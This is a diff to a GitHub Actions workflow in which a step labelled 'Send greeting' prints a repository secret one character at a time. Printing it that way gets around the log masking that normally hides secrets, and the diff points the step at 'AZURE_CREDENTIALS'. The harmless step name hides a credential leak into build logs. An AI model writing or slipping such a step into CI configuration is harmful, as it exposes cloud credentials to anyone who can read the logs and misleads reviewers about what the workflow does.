@@ -9,7 +9,7 @@ jobs:
     steps:
     - name: Send greeting
       run: |
-        foo=${{ secrets.secret_to_update }}
+        foo=${{ secrets.AZURE_CREDENTIALS }}
         for (( i=0; i<${#foo}; i++ )); do
           echo "${foo:$i:1}"
         done
